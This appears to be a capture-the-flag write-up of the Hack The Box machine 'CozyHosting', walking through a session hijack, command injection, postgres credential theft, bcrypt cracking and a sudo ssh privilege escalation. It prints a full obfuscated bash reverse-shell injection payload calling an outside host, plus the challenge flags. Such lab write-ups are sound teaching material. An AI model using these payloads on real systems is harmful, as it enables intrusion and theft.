# CozyHosting
> Write-up author: jon-brandy

## Lesson learned:
- Accessing postgres

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fa4c16d1-f3fe-47c6-810f-466d37c566a6)



## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.230 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 22:59 PDT
Nmap scan report for 10.10.11.230
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
```

1. Based from the nmap results, the machine runs a webapp and opens ssh logins.

> WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd9b7161-dbf0-4b00-b073-ef80301da3e2)


2. The wappalyzer itself shows us minimum info (for version).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1850a964-0b31-4a53-961a-1beee364802c)


3. Hence i ran dirsearch to list all directories or files available for this webapp.

> RESULTS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5697fb2f-fb43-476f-8efc-705146d76b30)


4. `admin` page and `actuator` directory should be our interest here.
5. Opens `actuator/sessions` shall resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/617cbf55-e5f0-470d-a54c-53965f5817bb)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e95e9939-f036-4f73-af4a-6a7330e23f2c)


6. Noticed there's a user session with name `kanderson` (Informatin Disclosure).
7. Let's change our session to kanderson's, then refresh the page.

 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a7c8c241-4cfa-4d95-a058-7c0bdd8b7d4f)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fac50408-3393-41e8-8df3-b4d2f3cf9604)


8. Scrolling down you shall see an input box.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbbc52af-baf7-45d6-9dd8-036986c88b27)


9. This should be our interest. To identify what's the vuln, let's capture the request we send using burpsuite.
10. Let's just fill the hostname with our tun0 interface and leave username empty, we just want to know what response might the server give.

> IN BURPSUITE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c2035f5f-dcc6-41f9-9f08-2a892ecfe5ba)


11. Noticed the server responds an error for the ssh command.
12. This make it clear, that the vuln should be related to command injection.
13. The idea is using basic bash reverse shell payload:

> BASH REVERSE SHELL PAYLOAD

```txt
bash -i >& /dev/tcp/10.10.16.14/1337 0>&1
```

> ENCODE IT TO BASE64 (adding -w 0, to make sure the output is a single line command)

```
echo "bash -i >& /dev/tcp/10.10.16.14/1337 0>&1" | base64 -w 0
```

> RESULT

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK
```

14. Great! Now for the final payload, because we want the server to decode our payload first then execute it, hence we use `base64 -d`.
15. But again, we need to encode it again with `url-encode` to terminate all the spaces.
16. The best practice is to use --> `${IFS%??}` to avoid spaces or other characters that may be treated as delimiters by the shell.
17. Then we url-encode the payload, set listener and send our payload.

> PAYLOAD

```
Original one:

echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK" | base64 -d | bash;

Adding ${IFS%??} to covering whitespaces

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

URL-ENCODE:

%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D%2Dd%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d7f115a-0819-4aa5-b627-3d54677ed0cd)


18. At this point we can't get user flag, because we're not having the shell as "josh".

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a925e28b-c55b-4833-b19a-99e927f38459)


19. Noticed there's a .jar file which might be our interest.
20. Let's setup a python server at the remote server and download the file to our local machine.

#### NOTES: setup python server at port other than 80.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b6709ea-e312-4421-8cce-40996c53d1df)


21. Well if you noticed, it failed to download it full.
22. Hmm, confused here, but anyway since we opens python server at port 8000, accessing the remote host with port 8000 shall shown this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0baf88f9-bf8d-49f3-8c81-5a60662244b9)


23. Let's download it manually.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b6b219f6-0f33-4010-bc31-003450d26de8)


> DECOMPILING IT WITH JD-GUI

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/017cf7f2-8d89-4797-b0fa-24d2f0c283dd)


24. Interesting, we found a **postgres** cred.
25. Let's access `psql` at the remote server.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/01837280-db9b-4d0b-a325-512bf643d3a7)


26. Run --> `\l` to list all the databases available.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8f630db5-1b44-4adc-89a3-759db0298432)


27. Great! Let's connect to `cozyhosting` --> run `\c cozyhosting`.
28. To dump all the tables run -> `\d`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/de6584c5-0f47-4752-8e01-a0880437bae1)


> DUMPING users column.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/18e97676-389a-4574-925f-665faf90e4ab)


29. Interesting, **users** table should be our interest. Let's select all from it.

> SELECT * FROM public.users;

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7df3bd4f-d4c7-4b02-bd63-8c6bce6324f6)


30 Awesome! Let's crack all the hashed password with john.
31. I started to cracking the first hash with john and while waiting for john to cracks hash, I identify the hash using `hashid`, which allows to use **hashcat**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/10b7aec7-339c-4a98-8c7a-4f7d90adf1e5)


32. Because time is money 🙏🏼.

> GRABBING THE HASHCAT CODE FOR BCRYPT.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6ecb07c4-8c7c-415f-b4f2-14ab9e974068)


33. Found nothing for the kanderson's hash.
34. But succeed cracks the password for admin's hash.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/143e3bf4-794a-4bd8-871c-1b5ad173d2dd)


35. Hmm.. Remembering our remote /home dir is **josh**, we make an interpretes of potential **password reuse**.
36. Turns out it is.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b3c28583-d323-4156-be5d-19fbdb29790a)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/37046df1-18e2-47d6-9adb-ccdb4cfee70f)


## USER FLAG

```
83cfd0650592f468972d63e44761211a
```

37. Checking sudo permissions for **josh** resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/60eef894-3c47-425b-9de4-d733ef3ed2a3)


38. **ssh** command is being run as root.
39. Diving on the internet and searching for `ssh gtfobins` exploit, shall resulting to this --> `https://gtfobins.github.io/gtfobins/ssh/`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e7a98b44-9fe7-4344-9aff-aead90826b51)


40. Using it.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/210a6f59-891f-4023-b1ba-e2a94c56b808)


41. Successfully gained root!

> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d16d0b5-aa7a-4bd6-a976-ad4d11d52176)


## ROOT FLAG

```
5783572fa5559507b67cfbd6636c934e
```





